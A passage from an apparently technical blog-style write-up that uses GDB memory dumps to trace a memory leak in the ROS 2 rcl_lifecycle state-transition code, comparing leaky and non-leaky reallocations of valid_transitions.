    <span id="cb122-75"><a href="#cb122-75" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c08:</span> 0x05    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-76"><a href="#cb122-76" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c10:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-77"><a href="#cb122-77" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c18:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-78"><a href="#cb122-78" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c20:</span> 0x40    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-79"><a href="#cb122-79" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c28:</span> 0x06    0x00    0x00    0x00    0xff    0x7f    0x00    0x00</span>
    <span id="cb122-80"><a href="#cb122-80" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c30:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-81"><a href="#cb122-81" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c38:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-82"><a href="#cb122-82" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c40:</span> 0x40    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-83"><a href="#cb122-83" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c48:</span> 0x07    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-84"><a href="#cb122-84" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c50:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-85"><a href="#cb122-85" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c58:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-86"><a href="#cb122-86" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c60:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-87"><a href="#cb122-87" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c68:</span> 0x32    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-88"><a href="#cb122-88" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c70:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-89"><a href="#cb122-89" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c78:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-90"><a href="#cb122-90" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c80:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-91"><a href="#cb122-91" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c88:</span> 0x33    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-92"><a href="#cb122-92" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c90:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-93"><a href="#cb122-93" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c98:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-94"><a href="#cb122-94" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ca0:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-95"><a href="#cb122-95" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ca8:</span> 0x34    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-96"><a href="#cb122-96" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cb0:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-97"><a href="#cb122-97" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cb8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-98"><a href="#cb122-98" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cc0:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-99"><a href="#cb122-99" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cc8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-100"><a href="#cb122-100" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cd0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-101"><a href="#cb122-101" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cd8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-102"><a href="#cb122-102" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ce0:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-103"><a href="#cb122-103" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ce8:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-104"><a href="#cb122-104" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cf0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-105"><a href="#cb122-105" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cf8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span></code></pre></div>
    <p>Transition is at the bottom, as expected.</p>
    <p>Let’s now inspect the memory of the leaky function:</p>
    <div class="sourceCode" id="cb123"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb123-1"><a href="#cb123-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> state-<span class="op">&gt;</span>valid_transition_size</span>
    <span id="cb123-2"><a href="#cb123-2" aria-hidden="true" tabindex="-1"></a><span class="va">$4</span> = 2</span>
    <span id="cb123-3"><a href="#cb123-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[Switching</span> to thread 7 <span class="er">(</span><span class="ex">Thread</span> 0x7fb920bca700 <span class="er">(</span><span class="ex">LWP</span> 7487<span class="kw">))</span><span class="ex">]</span><span class="er">(</span><span class="ex">running</span><span class="kw">)</span></span>
    <span id="cb123-4"><a href="#cb123-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[Switching</span> to thread 7 <span class="er">(</span><span class="ex">Thread</span> 0x7fb920bca700 <span class="er">(</span><span class="ex">LWP</span> 7487<span class="kw">))</span><span class="ex">]</span><span class="er">(</span><span class="ex">running</span><span class="kw">)</span></span>
    <span id="cb123-5"><a href="#cb123-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[Switching</span> to thread 7 <span class="er">(</span><span class="ex">Thread</span> 0x7fb920bca700 <span class="er">(</span><span class="ex">LWP</span> 7487<span class="kw">))</span><span class="ex">]</span><span class="er">(</span><span class="ex">running</span><span class="kw">)</span></span>
    <span id="cb123-6"><a href="#cb123-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[Switching</span> to thread 7 <span class="er">(</span><span class="ex">Thread</span> 0x7fb920bca700 <span class="er">(</span><span class="ex">LWP</span> 7487<span class="kw">))</span><span class="ex">]</span><span class="er">(</span><span class="ex">running</span><span class="kw">)</span></span>
    <span id="cb123-7"><a href="#cb123-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[Switching</span> to thread 7 <span class="er">(</span><span class="ex">Thread</span> 0x7fb920bca700 <span class="er">(</span><span class="ex">LWP</span> 7487<span class="kw">))</span><span class="ex">]</span><span class="er">(</span><span class="ex">running</span><span class="kw">)</span></span>
    <span id="cb123-8"><a href="#cb123-8" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">32*2</span></span>
    <span id="cb123-9"><a href="#cb123-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Undefined</span> command: <span class="st">&quot;32&quot;</span>.  Try <span class="st">&quot;help&quot;</span>.</span>
    <span id="cb123-10"><a href="#cb123-10" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> 32<span class="pp">*</span>2</span>
    <span id="cb123-11"><a href="#cb123-11" aria-hidden="true" tabindex="-1"></a><span class="va">$5</span> = 64</span>
    <span id="cb123-12"><a href="#cb123-12" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/64x</span> 0x60300005fda0 <span class="co"># state-&gt; valid_transitions</span></span>
    <span id="cb123-13"><a href="#cb123-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fda0:</span> 0x18    0x00    0x80    0x67    0xb9    0x7f    0x00    0x00</span>
    <span id="cb123-14"><a href="#cb123-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fda8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb123-15"><a href="#cb123-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdb0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb123-16"><a href="#cb123-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdb8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb123-17"><a href="#cb123-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdc0:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb123-18"><a href="#cb123-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdc8:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb123-19"><a href="#cb123-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdd0:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb123-20"><a href="#cb123-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60300005fdd8:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>the newly generated memory portion (initialized to <code>0xbe</code>)</p>
    <div class="sourceCode" id="cb124"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb124-1"><a href="#cb124-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/64x</span> 0x606000046e20 <span class="co"># new_valid_transitions</span></span>
    <span id="cb124-2"><a href="#cb124-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e20:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb124-3"><a href="#cb124-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e28:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb124-4"><a href="#cb124-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e30:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb124-5"><a href="#cb124-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e38:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb124-6"><a href="#cb124-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e40:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb124-7"><a href="#cb124-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e48:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb124-8"><a href="#cb124-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e50:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb124-9"><a href="#cb124-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e58:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span></code></pre></div>
    <p>After the asignation:</p>
    <div class="sourceCode" id="cb125"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb125-1"><a href="#cb125-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/64x</span> 0x606000046e20 <span class="co"># state-&gt;valid_transitions</span></span>
    <span id="cb125-2"><a href="#cb125-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e20:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb125-3"><a href="#cb125-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e28:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb125-4"><a href="#cb125-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e30:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb125-5"><a href="#cb125-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e38:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb125-6"><a href="#cb125-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e40:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb125-7"><a href="#cb125-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e48:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb125-8"><a href="#cb125-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e50:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb125-9"><a href="#cb125-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e58:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb125-10"><a href="#cb125-10" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition</span> </span>
    <span id="cb125-11"><a href="#cb125-11" aria-hidden="true" tabindex="-1"></a><span class="va">$6</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x7fffeab22d90</span></span>
    <span id="cb125-12"><a href="#cb125-12" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/32x</span> 0x7fffeab22d90 <span class="co"># transition</span></span>
    <span id="cb125-13"><a href="#cb125-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d90:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb125-14"><a href="#cb125-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d98:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb125-15"><a href="#cb125-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb125-16"><a href="#cb125-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span></code></pre></div>
    <p>Now for the leaky one:</p>
    <p>Before the re-allocation:</p>
    <div class="sourceCode" id="cb126"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb126-1"><a href="#cb126-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/96x</span> 0x606000046e20 <span class="co"># state-&gt;valid_transition</span></span>
    <span id="cb126-2"><a href="#cb126-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e20:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb126-3"><a href="#cb126-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e28:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb126-4"><a href="#cb126-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e30:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb126-5"><a href="#cb126-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e38:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb126-6"><a href="#cb126-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e40:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb126-7"><a href="#cb126-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e48:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb126-8"><a href="#cb126-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e50:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb126-9"><a href="#cb126-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e58:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb126-10"><a href="#cb126-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e60:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb126-11"><a href="#cb126-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e68:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb126-12"><a href="#cb126-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e70:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb126-13"><a href="#cb126-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x606000046e78:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>After having allocated:</p>
    <div class="sourceCode" id="cb127"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb127-1"><a href="#cb127-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gdb</span><span class="er">)</span> <span class="ex">x/96x</span> 0x60800002f7a0 <span class="co"># new_valid_transitions</span></span>
    <span id="cb127-2"><a href="#cb127-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a0:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb127-3"><a href="#cb127-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb127-4"><a href="#cb127-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb127-5"><a href="#cb127-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb127-6"><a href="#cb127-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c0:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb127-7"><a href="#cb127-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c8:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb127-8"><a href="#cb127-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb127-9"><a href="#cb127-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb127-10"><a href="#cb127-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb127-11"><a href="#cb127-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb127-12"><a href="#cb127-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb127-13"><a href="#cb127-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span></code></pre></div>
    <p>once overwritted:</p>
    <div class="sourceCode" id="cb128"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb128-1"><a href="#cb128-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/96x</span> 0x60800002f7a0</span>
    <span id="cb128-2"><a href="#cb128-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a0:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb128-3"><a href="#cb128-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb128-4"><a href="#cb128-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-5"><a href="#cb128-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-6"><a href="#cb128-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c0:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb128-7"><a href="#cb128-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c8:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb128-8"><a href="#cb128-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-9"><a href="#cb128-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-10"><a href="#cb128-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e0:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb128-11"><a href="#cb128-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e8:</span> 0x3e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb128-12"><a href="#cb128-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-13"><a href="#cb128-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-14"><a href="#cb128-14" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition</span></span>
    <span id="cb128-15"><a href="#cb128-15" aria-hidden="true" tabindex="-1"></a><span class="va">$7</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x7fffeab22d90</span></span>
    <span id="cb128-16"><a href="#cb128-16" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/32x</span> 0x7fffeab22d90</span>
    <span id="cb128-17"><a href="#cb128-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d90:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb128-18"><a href="#cb128-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d98:</span> 0x3e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb128-19"><a href="#cb128-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb128-20"><a href="#cb128-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span></code></pre></div>
    <p>All good so far. Let’s now proceed to the place where memory is released an inspect how <code>state-&gt;valid_transitions</code> is released for both the first state (non-leaky) and the second one (leaky).</p>
    <p>Before doing so, let’s first record the memory address of the corresponding states which will help later on debug things altogether from the <code>transition_map</code>. This is relevant because the <code>transition_map</code> has the following structure:</p>
    <div class="sourceCode" id="cb129"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb129-1"><a href="#cb129-1" aria-hidden="true" tabindex="-1"></a><span class="ex">transition_map</span> = {rcl_lifecycle_transition_map_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001548}</span> 0x613000001548</span>
    <span id="cb129-2"><a href="#cb129-2" aria-hidden="true" tabindex="-1"></a>   <span class="ex">states</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001700}</span> 0x613000001700</span>
    <span id="cb129-3"><a href="#cb129-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">states_size</span> = {unsigned int} 11</span>
    <span id="cb129-4"><a href="#cb129-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x618000004c80}</span> 0x618000004c80</span>
    <span id="cb129-5"><a href="#cb129-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">transitions_size</span> = {unsigned int} 25</span></code></pre></div>
    <p>Moreover, each state:</p>
    <div class="sourceCode" id="cb130"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb130-1"><a href="#cb130-1" aria-hidden="true" tabindex="-1"></a><span class="ex">states</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001700}</span> 0x613000001700</span>
    <span id="cb130-2"><a href="#cb130-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">label</span> = {const char <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x7fb92cec98e0}</span> <span class="st">&quot;unknown&quot;</span></span>
    <span id="cb130-3"><a href="#cb130-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">id</span> = {unsigned int} 0</span>
    <span id="cb130-4"><a href="#cb130-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">valid_transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x0}</span> NULL</span>
    <span id="cb130-5"><a href="#cb130-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">valid_transition_size</span> = {unsigned int} 0</span></code></pre></div>
    <p>Let’s then record things for the leaky and non-leaky cases. Here’s the plan:</p>
    <ul>
    <li>Reach non-leaky, place breakpoint in new_valid_transitions</li>
    <li>Determine memory of <code>transition_map-&gt;states</code> and <code>transition_map-&gt;states-&gt;valid_transitions</code> and keep it handy</li>
    <li>Record address of state
    <ul>
    <li>Validate that state is within transition_map</li>
    </ul></li>
    <li>Record structure of state taking special care for to <code>valid_transitions</code></li>
    <li>Head to <code>rcl_lifecycle_transition_map_fini</code> and debug memory release</li>
    </ul>
    <p>Let’s execute:</p>
    <div class="sourceCode" id="cb131"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb131-1"><a href="#cb131-1" aria-hidden="true" tabindex="-1"></a><span class="ex">transition_map</span> = {rcl_lifecycle_transition_map_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001548}</span> 0x613000001548</span>
    <span id="cb131-2"><a href="#cb131-2" aria-hidden="true" tabindex="-1"></a>   <span class="ex">states</span> = {rcl_lifecycle_state_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x613000001700}</span> 0x613000001700</span>
    <span id="cb131-3"><a href="#cb131-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">states_size</span> = {unsigned int} 11</span>
    <span id="cb131-4"><a href="#cb131-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">transitions</span> = {rcl_lifecycle_transition_t <span class="pp">*</span> <span class="kw">|</span> <span class="ex">0x617000004a00}</span> 0x617000004a00</span>
    <span id="cb131-5"><a href="#cb131-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">transitions_size</span> = {unsigned int} 24</span></code></pre></div>
